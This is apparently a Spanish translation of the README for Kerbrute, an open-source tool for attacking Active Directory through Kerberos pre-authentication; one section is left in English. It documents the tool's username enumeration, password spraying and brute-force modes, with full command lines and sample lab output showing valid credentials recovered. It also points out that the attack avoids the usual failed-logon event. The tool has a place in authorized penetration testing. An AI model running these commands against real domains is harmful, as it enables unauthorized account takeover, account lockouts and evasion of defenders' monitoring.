<img src="/img1.jpg" alt="bannerkerbrute" style="display: block; margin: auto;" width="500" >

# Kerbrute
[![CircleCI](https://circleci.com/gh/ropnop/kerbrute.svg?style=svg)](https://circleci.com/gh/ropnop/kerbrute)

Una herramienta para realizar rápidamente ataques de fuerza bruta y enumerar cuentas válidas de Active Directory a través de la preautenticación de Kerberos.

Descarga los últimos binarios desde la [página de lanzamientos](https://github.com/ropnop/kerbrute/releases/latest) comenzar.

## Antecedentes
Esta herramienta surgió a partir de algunos [scripts de bash](https://github.com/ropnop/kerberos_windows_scripts) que escribí hace algunos años para realizar ataques de fuerza bruta usando el cliente Kerberos Heimdal desde Linux. Quería algo que no requiriera privilegios para instalar un cliente de Kerberos, y cuando encontré la increíble implementación pura de Go de Kerberos [gokrb5](https://github.com/jcmturner/gokrb5), decidí finalmente aprender Go y escribir esto.

Realizar ataques de fuerza bruta a contraseñas de Windows con Kerberos es mucho más rápido que cualquier otro enfoque que conozco, y potencialmente más sigiloso, ya que los fallos de preautenticación no activan el evento tradicional `An account failed to log on` 4625. Con Kerberos, puedes validar un nombre de usuario o probar un inicio de sesión enviando solo un paquete UDP al KDC (Controlador de Dominio).

Para más información, consulta mi charla en Troopers 2019, Fun with LDAP and Kerberos (enlace pendiente).

## Uso
Kerbrute tiene cuatro comandos principales:
 * **bruteuser** - Fuerza bruta la contraseña de un solo usuario desde una lista de palabras.
 * **bruteforce** - Lee combinaciones de usuario/contraseña desde un archivo o stdin y las prueba.
 * **passwordspray** - Prueba una sola contraseña contra una lista de usuarios.
 * **userenum** - Enumera nombres de usuario de dominio válidos a través de Kerberos.

Debe especificarse un dominio (`-d`) o un controlador de dominio (`--dc`). Si no se proporciona un Controlador de Dominio, se buscará el KDC a través de DNS.

Por defecto, Kerbrute es multihilo y utiliza 10 hilos. Esto se puede cambiar con la opción `-t`.

La salida se registra en stdout, pero se puede especificar un archivo de registro con `-o`.

Por defecto, no se registran fallos, pero esto se puede cambiar con `-v`.

Finalmente, Kerbrute tiene una opción `--safe`. Cuando esta opción está habilitada, si una cuenta es bloqueada, se abortarán todos los hilos para evitar bloquear otras cuentas.

Se puede usar el comando help para obtener más información.

```
$ ./kerbrute -h

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (bc1d606) - 11/15/20 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string          The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int          Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string      The full domain to use (e.g. contoso.com)
      --downgrade          Force downgraded encryption type (arcfour-hmac-md5)
      --hash-file string   File to save AS-REP hashes to (if any captured), otherwise just logged
  -h, --help               help for kerbrute
  -o, --output string      File to write logs to. Optional.
      --safe               Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int        Threads to use (default 10)
  -v, --verbose            Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

### Enumeración de usuarios
Para enumerar nombres de usuario, Kerbrute envía solicitudes TGT sin preautenticación. Si el KDC responde con un error PRINCIPAL UNKNOWN, el nombre de usuario no existe. Sin embargo, si el KDC solicita preautenticación, sabemos que el nombre de usuario existe y continuamos. Esto no causa fallos de inicio de sesión, por lo que no bloqueará cuentas. Esto genera un ID de evento de Windows [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) si el registro de Kerberos está habilitado.

```
root@kali:~# ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:28:04 >  Using KDC(s):
2019/03/06 21:28:04 >   pdc01.lab.ropnop.com:88

2019/03/06 21:28:04 >  [+] VALID USERNAME:       amata@lab.ropnop.com
2019/03/06 21:28:04 >  [+] VALID USERNAME:       thoffman@lab.ropnop.com
2019/03/06 21:28:04 >  Done! Tested 1001 usernames (2 valid) in 0.425 seconds
```

### Ataque de rociado de contraseñas
With `passwordspray`, Kerbrute will perform a horizontal brute force attack against a list of domain users. This is useful for testing one or two common passwords when you have a large list of users. WARNING: this does will increment the failed login count and lock out accounts. This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771).

```
root@kali:~# ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:37:29 >  Using KDC(s):
2019/03/06 21:37:29 >   pdc01.lab.ropnop.com:88

2019/03/06 21:37:35 >  [+] VALID LOGIN:  callen@lab.ropnop.com:Password123
2019/03/06 21:37:37 >  [+] VALID LOGIN:  eshort@lab.ropnop.com:Password123
2019/03/06 21:37:37 >  Done! Tested 2755 logins (2 successes) in 7.674 seconds
```

### Brute User
Este es un ataque de fuerza bruta tradicional contra un nombre de usuario. ¡Solo ejecuta esto si estás seguro de que no hay una política de bloqueo de cuentas! Esto generará los IDs de evento [4768 - Un ticket de autenticación de Kerberos (TGT) fue solicitado](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) y [4771 - Falló la preautenticación de Kerberos](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771).

```
root@kali:~# ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:38:24 >  Using KDC(s):
2019/03/06 21:38:24 >   pdc01.lab.ropnop.com:88

2019/03/06 21:38:27 >  [+] VALID LOGIN:  thoffman@lab.ropnop.com:Summer2017
2019/03/06 21:38:27 >  Done! Tested 1001 logins (1 successes) in 2.711 seconds
```

### Brute Force
Este modo simplemente lee combinaciones de nombre de usuario y contraseña (en el formato `usuario:contraseña`) desde un archivo o desde `stdin` y las prueba con la PreAutenticación de Kerberos. Se saltará las líneas en blanco o con nombres de usuario/contraseñas vacíos. Esto generará los IDs de evento [4768 - Un ticket de autenticación de Kerberos (TGT) fue solicitado](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) y [4771 - Falló la preautenticación de Kerberos](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771).

```
$ cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/11/19 - Ronnie Flathers @ropnop

2019/05/11 18:40:56 >  Using KDC(s):
2019/05/11 18:40:56 >   pdc01.lab.ropnop.com:88

2019/05/11 18:40:56 >  [+] VALID LOGIN:  athomas@lab.ropnop.com:Password1234
2019/05/11 18:40:56 >  Done! Tested 7 logins (1 successes) in 0.114 seconds
```

## Instalación
Puedes descargar binarios precompilados para Linux, Windows y Mac desde la [página de lanzamientos](https://github.com/ropnop/kerbrute/releases/tag/latest). Si quieres estar al día, también puedes instalarlo con Go:

```
$ go get github.com/ropnop/kerbrute
```

Con el repositorio clonado, también puedes usar el archivo Make para compilarlo para arquitecturas comunes:

```
$ make help
help:            Show this help.
windows:  Make Windows x86 and x64 Binaries
linux:  Make Linux x86 and x64 Binaries
mac:  Make Darwin (Mac) x86 and x64 Binaries
clean:  Delete any binaries
all:  Make Windows, Linux and Mac x86/x64 Binaries

$ make all
Done.
Building for windows amd64..
Building for windows 386..
Done.
Building for linux amd64...
Building for linux 386...
Done.
Building for mac amd64...
Building for mac 386...
Done.

$ ls dist/
kerbrute_darwin_386        kerbrute_linux_386         kerbrute_windows_386.exe
kerbrute_darwin_amd64      kerbrute_linux_amd64       kerbrute_windows_amd64.exe
```

## Créditos
Un gran agradecimiento a jcmturner por su implementación pura de KRB5 en Go: https://github.com/jcmturner/gokrb5. Un proyecto increíble y muy bien documentado. No podría haber hecho esto sin ese proyecto.

Gracias a [audibleblink](https://github.com/audibleblink) por la sugerencia e implementación de la opción `delay`.
